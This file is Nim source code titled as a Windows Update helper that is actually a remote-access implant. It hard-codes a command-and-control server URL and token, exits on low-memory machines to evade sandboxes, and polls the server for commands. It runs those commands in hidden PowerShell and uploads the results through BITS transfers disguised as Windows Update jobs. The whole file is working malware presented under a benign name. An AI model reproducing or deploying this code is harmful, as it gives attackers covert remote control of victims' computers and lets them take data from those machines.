# Windows Update Helper - BITS Transfer
import winim/lean
import winim/com
import std/[strutils, random, os, times]

proc getC2(): string = "https://geometry-offered-guns-replies.trycloudflare.com"
proc getApiKey(): string = "051dfe1cf5e570846315512a11396f7d"
proc getToken(): string = "8ca60eebbe9a141869305ed9ab1a0050"

proc bitsDownload(url, dest: string): bool =
  result = false
  CoInitialize(nil)
  defer: CoUninitialize()
  try:
    var mgr = CreateObject("Microsoft.BITS.Manager")
    if mgr.isNil: return false
    var job = mgr.CreateJob("WindowsUpdate", 1)
    job.AddFile(url, dest)
    job.SetPriority(1)
    job.Resume()
    
    for i in 0..60:
      Sleep(500)
      let state = job.State
      if state == 4: # BG_JOB_STATE_TRANSFERRED
        job.Complete()
        return true
      elif state == 5 or state == 6: # ERROR or CANCELLED
        job.Cancel()
        return false
    job.Cancel()
  except:
    discard

proc readTemp(path: string): string =
  result = ""
  if fileExists(path):
    try:
      result = readFile(path)
      removeFile(path)
    except:
      discard

proc runPS(cmd: string): string =
  result = ""
  let tempOut = getEnv("TEMP") & "\\wu" & $rand(9999) & ".tmp"
  
  var si: STARTUPINFOW
  var pi: PROCESS_INFORMATION
  si.cb = sizeof(STARTUPINFOW).DWORD
  si.dwFlags = STARTF_USESHOWWINDOW
  si.wShowWindow = SW_HIDE
  
  let fullCmd = "powershell.exe -NoP -NonI -W Hidden -C \"" & cmd & " | Out-File -Enc ascii '" & tempOut & "'\""
  var cmdW = newWideCString(fullCmd)
  
  if CreateProcessW(nil, cmdW, nil, nil, FALSE, CREATE_NO_WINDOW, nil, nil, addr si, addr pi) != 0:
    discard WaitForSingleObject(pi.hProcess, 30000)
    discard CloseHandle(pi.hProcess)
    discard CloseHandle(pi.hThread)
    Sleep(100)
    result = readTemp(tempOut)

proc bitsUpload(url, data: string): bool =
  # Use PowerShell with BITS for upload
  let tempFile = getEnv("TEMP") & "\\wuu" & $rand(9999) & ".tmp"
  writeFile(tempFile, data)
  let cmd = "Start-BitsTransfer -Source '" & tempFile & "' -Destination '" & url & "' -TransferType Upload -HttpMethod POST"
  discard runPS(cmd)
  try: removeFile(tempFile)
  except: discard
  return true

proc httpGet(url: string): string =
  # Use BITS download
  let tempFile = getEnv("TEMP") & "\\wud" & $rand(9999) & ".tmp"
  if bitsDownload(url, tempFile):
    result = readTemp(tempFile)
  else:
    result = ""

proc extractCmd(json: string): string =
  result = ""
  let idx = json.find("\"command\":")
  if idx >= 0:
    var start = idx + 10
    while start < json.len and json[start] in {' ', '"'}: inc start
    if start > 0 and json[start-1] == '"':
      var endIdx = start
      while endIdx < json.len and json[endIdx] != '"': inc endIdx
      if endIdx > start: result = json[start..endIdx-1]

proc escapeJson(s: string): string =
  result = ""
  for c in s:
    case c
    of '\\': result.add("\\\\")
    of '"': result.add("\\\"")
    of '\n': result.add("\\n")
    of '\r': result.add("\\r")
    else: result.add(c)

proc main() =
  Sleep(3000 + rand(2000).int32)
  
  var memStatus: MEMORYSTATUSEX
  memStatus.dwLength = sizeof(MEMORYSTATUSEX).DWORD
  GlobalMemoryStatusEx(addr memStatus)
  if cast[uint64](memStatus.ullTotalPhys) < 2000000000'u64:
    ExitProcess(0)
  
  randomize()
  let c2 = getC2()
  let token = getToken()
  
  var hostname: array[256, char]
  var size: DWORD = 256
  GetComputerNameA(cast[LPSTR](addr hostname[0]), addr size)
  let hn = $(cast[cstring](addr hostname[0]))
  let agentId = hn & "-" & toHex(rand(0xFFFF), 4).toLowerAscii()
  
  let cmdUrl = c2 & "/bits/cmd/" & agentId & "?key=" & token
  let resultUrl = c2 & "/bits/result/" & agentId & "?key=" & token
  
  while true:
    try:
      let resp = httpGet(cmdUrl)
      if resp.len > 0:
        let cmd = extractCmd(resp)
        if cmd.len > 0:
          let output = runPS(cmd)
          let json = "{\"result\":\"" & escapeJson(output) & "\"}"
          discard bitsUpload(resultUrl, json)
    except:
      discard
    Sleep((5000 + rand(3000)).int32)

when isMainModule:
  main()
